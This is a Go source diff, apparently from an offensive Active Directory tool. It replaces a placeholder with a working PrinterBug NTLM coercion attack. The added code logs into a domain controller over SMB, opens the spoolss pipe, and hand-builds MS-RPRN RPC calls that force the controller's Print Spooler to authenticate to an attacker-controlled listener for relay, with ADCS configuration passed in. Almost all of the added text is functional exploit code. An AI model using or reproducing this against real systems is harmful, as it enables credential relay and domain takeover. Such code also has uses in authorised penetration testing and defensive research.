@@ -27,12 +27,12 @@ const (
 // UNC paths (\\ip@port/path) are used so the target sends HTTP auth to the
 // custom port instead of SMB to 445. This allows relaying from a non-admin
 // pivot machine using ports >1024.
-func CoerceNTLMAuth(targetDC, listenerIP string, listenerPort int, method CoerceMethod) error {
+func CoerceNTLMAuth(targetDC, listenerIP string, listenerPort int, method CoerceMethod, cfg *ADCSConfig) error {
 	switch method {
 	case CoercePetitPotam:
 		return petitPotam(targetDC, listenerIP, listenerPort)
 	case CoercePrinterBug:
-		return printerBug(targetDC, listenerIP)
+		return printerBug(targetDC, listenerIP, cfg)
 	default:
 		return fmt.Errorf("unknown coercion method: %s", method)
 	}
@@ -42,6 +42,13 @@ func CoerceNTLMAuth(targetDC, listenerIP string, listenerPort int, method Coerce
 var efsrpcUUID = [16]byte{
 	0x88, 0xd4, 0x81, 0xc6, 0x50, 0xd8, 0xd0, 0x11,
 	0x8c, 0x52, 0x00, 0xc0, 0x4f, 0xd9, 0x0f, 0x7e,
+}
+
+// MS-RPRN interface UUID: 12345678-1234-ABCD-EF00-0123456789AB v1.0
+// Wire format (byte-swapped first three groups per DCE/RPC convention)
+var rprnUUID = [16]byte{
+	0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xCD, 0xAB,
+	0xEF, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB,
 }
 
 // --- Stateful SMB2 session ---
@@ -321,13 +328,347 @@ func petitPotam(targetDC, listenerIP string, listenerPort int) error {
 	return fmt.Errorf("PetitPotam failed on all pipes: %w", pipeErr)
 }
 
-// printerBug triggers NTLM auth via MS-RPRN RpcRemoteFindFirstPrinterChangeNotification.
-// Requires authenticated access to the target (unlike PetitPotam's unauthenticated variant).
-func printerBug(targetDC, listenerIP string) error {
-	fmt.Printf("[*] PrinterBug: Triggering NTLM auth from %s to %s\n", targetDC, listenerIP)
-	fmt.Printf("[!] PrinterBug requires authenticated SMB access — use PetitPotam for unauthenticated coercion\n")
-	fmt.Printf("[*] Manual: python3 dementor.py -d <DOMAIN> -u <USER> -p <PASS> %s %s\n", listenerIP, targetDC)
-	return fmt.Errorf("PrinterBug requires authentication — use PetitPotam or run dementor.py manually")
+// printerBug triggers NTLM auth via MS-RPRN (Print System Remote Protocol).
+// The attack opens an authenticated SMB session to the target's \pipe\spoolss,
+// binds to the MS-RPRN interface, calls RpcOpenPrinterEx (opnum 69) to obtain
+// a printer handle, then calls RpcRemoteFindFirstPrinterChangeNotificationEx
+// (opnum 65) with a UNC path pointing to the attacker's listener.
+// This causes the target's Print Spooler to authenticate back to the listener.
+func printerBug(targetDC, listenerIP string, cfg *ADCSConfig) error {
+	if cfg == nil {
+		return fmt.Errorf("PrinterBug requires credentials (cfg is nil)")
+	}
+	fmt.Printf("[*] PrinterBug: Triggering NTLM auth from %s to \\\\%s\\share\n", targetDC, listenerIP)
+
+	conn, err := net.DialTimeout("tcp", targetDC+":445", 10*time.Second)
+	if err != nil {
+		return fmt.Errorf("connect to %s:445: %w", targetDC, err)
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(30 * time.Second))
+
+	s := &smbSession{conn: conn}
+
+	// SMB2 negotiate
+	if err := s.negotiate(); err != nil {
+		return fmt.Errorf("SMB negotiate: %w", err)
+	}
+
+	// Authenticated session setup — PrinterBug requires valid domain credentials
+	if cfg.Kerberos {
+		if err := s.sessionSetupKerberos(cfg, targetDC); err != nil {
+			return fmt.Errorf("SMB Kerberos auth: %w", err)
+		}
+		fmt.Printf("[+] SMB2 Kerberos session established (authenticated as %s)\n", cfg.Username)
+	} else {
+		if err := s.sessionSetupNTLM(cfg); err != nil {
+			return fmt.Errorf("SMB NTLM auth: %w", err)
+		}
+		fmt.Printf("[+] SMB2 session established (authenticated as %s)\n", cfg.Username)
+	}
+
+	// Tree connect to IPC$
+	if err := s.treeConnect(targetDC); err != nil {
+		return fmt.Errorf("SMB tree connect IPC$: %w", err)
+	}
+
+	// Open the spoolss named pipe
+	if err := s.createPipe("spoolss"); err != nil {
+		return fmt.Errorf("open \\pipe\\spoolss: %w (is the Print Spooler service running?)", err)
+	}
+	fmt.Printf("[+] Opened pipe: \\pipe\\spoolss\n")
+
+	// RPC bind to MS-RPRN
+	if err := rpcBind(s, rprnUUID); err != nil {
+		return fmt.Errorf("RPC bind MS-RPRN: %w", err)
+	}
+	fmt.Printf("[+] RPC bind to MS-RPRN successful\n")
+
+	// Step 1: RpcOpenPrinterEx (opnum 69) to get a printer handle
+	printerName := fmt.Sprintf(`\\%s`, targetDC)
+	handle, err := rpcOpenPrinterEx(s, printerName)
+	if err != nil {
+		return fmt.Errorf("RpcOpenPrinterEx: %w", err)
+	}
+	fmt.Printf("[+] Got printer handle for %s\n", printerName)
+
+	// Step 2: RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)
+	// with UNC path to attacker listener
+	captureUNC := fmt.Sprintf(`\\%s\share`, listenerIP)
+	if err := rpcFindFirstPrinterChangeNotificationEx(s, handle, captureUNC); err != nil {
+		// Errors like STATUS_ACCESS_DENIED or RPC faults are expected on some
+		// configurations, but the coercion may have already triggered.
+		fmt.Printf("[!] RpcRemoteFindFirstPrinterChangeNotificationEx returned error: %v\n", err)
+		fmt.Printf("[*] The coercion may still have triggered — check your relay listener\n")
+		return nil
+	}
+
+	fmt.Printf("[+] PrinterBug: Coercion sent — %s should authenticate to \\\\%s\\share\n", targetDC, listenerIP)
+	return nil
+}
+
+// rpcOpenPrinterEx calls RpcOpenPrinterEx (opnum 69 / 0x45) on MS-RPRN.
+// Returns the 20-byte printer handle from the response.
+//
+// NDR layout:
+//
+//	pPrinterName:   [string,unique] wchar_t* — e.g. "\\DC01"
+//	pDatatype:      [string,unique] wchar_t* — NULL
+//	pDevModeContainer: DEVMODE_CONTAINER { cbBuf=0, pDevMode=NULL }
+//	AccessRequired: DWORD — PRINTER_ACCESS_USE (0x00000008)
+//	pClientInfo:    SPLCLIENT_CONTAINER { Level=1, pClientInfo pointer }
+func rpcOpenPrinterEx(s *smbSession, printerName string) ([]byte, error) {
+	callID := rand.Uint32()
+
+	var stub []byte
+
+	// pPrinterName: NDR unique pointer to conformant varying string (UTF-16LE)
+	nameUTF16 := coerceUTF16LE(printerName)
+	nameChars := uint32(len(nameUTF16)/2 + 1) // +1 for null terminator
+
+	stub = appendLE32(stub, 0x00020000) // referent ID (non-null pointer)
+	stub = appendLE32(stub, nameChars)  // max count
+	stub = appendLE32(stub, 0)          // offset
+	stub = appendLE32(stub, nameChars)  // actual count
+	stub = append(stub, nameUTF16...)
+	stub = append(stub, 0, 0) // null terminator
+	for len(stub)%4 != 0 {
+		stub = append(stub, 0)
+	}
+
+	// pDatatype: NULL pointer
+	stub = appendLE32(stub, 0)
+
+	// DEVMODE_CONTAINER: cbBuf(4) + pDevMode pointer(4) = NULL
+	stub = appendLE32(stub, 0) // cbBuf = 0
+	stub = appendLE32(stub, 0) // pDevMode = NULL
+
+	// AccessRequired: PRINTER_ACCESS_USE (0x00000008)
+	stub = appendLE32(stub, 0x00000008)
+
+	// SPLCLIENT_CONTAINER: Level(4) + union tag(4) + pointer to SPLCLIENT_INFO_1
+	stub = appendLE32(stub, 1)          // Level = 1
+	stub = appendLE32(stub, 1)          // union discriminant = 1
+	stub = appendLE32(stub, 0x00020004) // referent ID for pClientInfo
+
+	// SPLCLIENT_INFO_1:
+	// dwSize(4) + pMachineName pointer(4) + pUserName pointer(4) +
+	// dwBuildNum(4) + dwMajorVersion(4) + dwMinorVersion(4) + wProcessorArchitecture(2) + pad(2)
+	stub = appendLE32(stub, 60)         // dwSize
+	stub = appendLE32(stub, 0x00020008) // pMachineName referent ID
+	stub = appendLE32(stub, 0x0002000C) // pUserName referent ID
+	stub = appendLE32(stub, 7601)       // dwBuildNum (Win7 SP1)
+	stub = appendLE32(stub, 6)          // dwMajorVersion
+	stub = appendLE32(stub, 1)          // dwMinorVersion
+	stub = append(stub, 9, 0) // wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64
+	stub = append(stub, 0, 0) // pad to 4-byte alignment
+
+	// pMachineName: conformant varying string
+	machineUTF16 := coerceUTF16LE(`\\`)
+	machineChars := uint32(len(machineUTF16)/2 + 1)
+	stub = appendLE32(stub, machineChars) // max count
+	stub = appendLE32(stub, 0)            // offset
+	stub = appendLE32(stub, machineChars) // actual count
+	stub = append(stub, machineUTF16...)
+	stub = append(stub, 0, 0) // null terminator
+	for len(stub)%4 != 0 {
+		stub = append(stub, 0)
+	}
+
+	// pUserName: conformant varying string
+	userUTF16 := coerceUTF16LE(`\\`)
+	userChars := uint32(len(userUTF16)/2 + 1)
+	stub = appendLE32(stub, userChars) // max count
+	stub = appendLE32(stub, 0)         // offset
+	stub = appendLE32(stub, userChars) // actual count
+	stub = append(stub, userUTF16...)
+	stub = append(stub, 0, 0) // null terminator
+	for len(stub)%4 != 0 {
+		stub = append(stub, 0)
+	}
+
+	// Build DCE/RPC REQUEST (type 0x00)
+	reqHdr := make([]byte, 8)
+	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub))) // alloc hint
+	binary.LittleEndian.PutUint16(reqHdr[4:6], 0)                 // context_id
+	binary.LittleEndian.PutUint16(reqHdr[6:8], 69)                // opnum 69 = RpcOpenPrinterEx
+
+	fragLen := uint16(16 + len(reqHdr) + len(stub))
+	hdr := make([]byte, 16)
+	hdr[0] = 5    // version major
+	hdr[1] = 0    // version minor
+	hdr[2] = 0x00 // REQUEST
+	hdr[3] = 0x03 // first+last fragment
+	hdr[4] = 0x10 // data rep: little-endian
+	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
+	binary.LittleEndian.PutUint32(hdr[12:16], callID)
+
+	var rpcReq []byte
+	rpcReq = append(rpcReq, hdr...)
+	rpcReq = append(rpcReq, reqHdr...)
+	rpcReq = append(rpcReq, stub...)
+
+	if err := s.writePipe(rpcReq); err != nil {
+		return nil, fmt.Errorf("write RpcOpenPrinterEx: %w", err)
+	}
+
+	resp, err := s.readPipe()
+	if err != nil {
+		return nil, fmt.Errorf("read RpcOpenPrinterEx response: %w", err)
+	}
+
+	return parseOpenPrinterExResponse(resp)
+}
+
+// parseOpenPrinterExResponse extracts the 20-byte printer handle from the
+// RpcOpenPrinterEx DCE/RPC response.
+func parseOpenPrinterExResponse(resp []byte) ([]byte, error) {
+	rpcData, err := extractRPCFromReadResponse(resp)
+	if err != nil {
+		return nil, fmt.Errorf("extract RPC data: %w", err)
+	}
+
+	if len(rpcData) < 24 {
+		return nil, fmt.Errorf("RPC response too short: %d bytes", len(rpcData))
+	}
+
+	pktType := rpcData[2]
+	if pktType == 0x03 { // FAULT
+		if len(rpcData) >= 28 {
+			faultStatus := binary.LittleEndian.Uint32(rpcData[24:28])
+			return nil, fmt.Errorf("RPC fault: status=0x%08X", faultStatus)
+		}
+		return nil, fmt.Errorf("RPC fault")
+	}
+	if pktType != 0x02 { // RESPONSE
+		return nil, fmt.Errorf("unexpected RPC packet type: 0x%02X", pktType)
+	}
+
+	// Stub data starts at offset 24 (16 header + 8 response header).
+	// RpcOpenPrinterEx returns: HANDLE(20 bytes) + DWORD return value(4).
+	stub := rpcData[24:]
+	if len(stub) < 24 {
+		return nil, fmt.Errorf("RPC response stub too short for handle: %d bytes", len(stub))
+	}
+
+	// Check return value (last 4 bytes)
+	retVal := binary.LittleEndian.Uint32(stub[20:24])
+	if retVal != 0 {
+		return nil, fmt.Errorf("RpcOpenPrinterEx failed: error=0x%08X", retVal)
+	}
+
+	handle := make([]byte, 20)
+	copy(handle, stub[0:20])
+	return handle, nil
+}
+
+// rpcFindFirstPrinterChangeNotificationEx calls
+// RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65 / 0x41) on MS-RPRN.
+// This triggers the Print Spooler to authenticate back to the attacker's UNC path.
+//
+// NDR layout:
+//
+//	hPrinter:       HANDLE (20 bytes)
+//	fdwFlags:       DWORD — PRINTER_CHANGE_ADD_JOB (0x00000100)
+//	fdwOptions:     DWORD — 0
+//	pszLocalMachine: [string,unique] wchar_t* — UNC path to attacker (e.g. "\\10.0.0.5\share")
+//	dwPrinterLocal: DWORD — 0
+//	pOptions:       [unique] RPC_V2_NOTIFY_OPTIONS* — NULL
+func rpcFindFirstPrinterChangeNotificationEx(s *smbSession, handle []byte, captureUNC string) error {
+	callID := rand.Uint32()
+
+	var stub []byte
+
+	// hPrinter: 20-byte context handle
+	stub = append(stub, handle...)
+
+	// fdwFlags: PRINTER_CHANGE_ADD_JOB
+	stub = appendLE32(stub, 0x00000100)
+
+	// fdwOptions: 0
+	stub = appendLE32(stub, 0)
+
+	// pszLocalMachine: NDR unique pointer to conformant varying string
+	uncUTF16 := coerceUTF16LE(captureUNC)
+	uncChars := uint32(len(uncUTF16)/2 + 1) // +1 for null terminator
+
+	stub = appendLE32(stub, 0x00020000) // referent ID (non-null)
+	stub = appendLE32(stub, uncChars)   // max count
+	stub = appendLE32(stub, 0)          // offset
+	stub = appendLE32(stub, uncChars)   // actual count
+	stub = append(stub, uncUTF16...)
+	stub = append(stub, 0, 0) // null terminator
+	for len(stub)%4 != 0 {
+		stub = append(stub, 0)
+	}
+
+	// dwPrinterLocal: 0
+	stub = appendLE32(stub, 0)
+
+	// pOptions: NULL pointer
+	stub = appendLE32(stub, 0)
+
+	// Build DCE/RPC REQUEST
+	reqHdr := make([]byte, 8)
+	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub))) // alloc hint
+	binary.LittleEndian.PutUint16(reqHdr[4:6], 0)                 // context_id
+	binary.LittleEndian.PutUint16(reqHdr[6:8], 65)                // opnum 65 = RpcRemoteFindFirstPrinterChangeNotificationEx
+
+	fragLen := uint16(16 + len(reqHdr) + len(stub))
+	hdr := make([]byte, 16)
+	hdr[0] = 5    // version major
+	hdr[1] = 0    // version minor
+	hdr[2] = 0x00 // REQUEST
+	hdr[3] = 0x03 // first+last fragment
+	hdr[4] = 0x10 // data rep: little-endian
+	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
+	binary.LittleEndian.PutUint32(hdr[12:16], callID)
+
+	var rpcReq []byte
+	rpcReq = append(rpcReq, hdr...)
+	rpcReq = append(rpcReq, reqHdr...)
+	rpcReq = append(rpcReq, stub...)
+
+	if err := s.writePipe(rpcReq); err != nil {
+		return fmt.Errorf("write RpcRemoteFindFirstPrinterChangeNotificationEx: %w", err)
+	}
+
+	// Read response — the coercion fires when the spooler processes this request,
+	// so even an error response means the auth callback may have been triggered.
+	resp, err := s.readPipe()
+	if err != nil {
+		// Read errors are common here because the spooler may drop the connection
+		// after triggering the callback. Treat as potential success.
+		return nil
+	}
+
+	// Parse RPC response to check for errors
+	rpcData, err := extractRPCFromReadResponse(resp)
+	if err != nil {
+		return nil
+	}
+
+	if len(rpcData) < 24 {
+		return nil
+	}
+
+	pktType := rpcData[2]
+	if pktType == 0x03 { // FAULT
+		if len(rpcData) >= 28 {
+			faultStatus := binary.LittleEndian.Uint32(rpcData[24:28])
+			return fmt.Errorf("RPC fault: status=0x%08X", faultStatus)
+		}
+		return fmt.Errorf("RPC fault")
+	}
+
+	if pktType == 0x02 && len(rpcData) >= 28 {
+		retVal := binary.LittleEndian.Uint32(rpcData[24:28])
+		if retVal != 0 {
+			return fmt.Errorf("RpcRemoteFindFirstPrinterChangeNotificationEx: error=0x%08X", retVal)
+		}
+	}
+
+	return nil
 }
 
 // --- DCE/RPC over SMB pipe ---
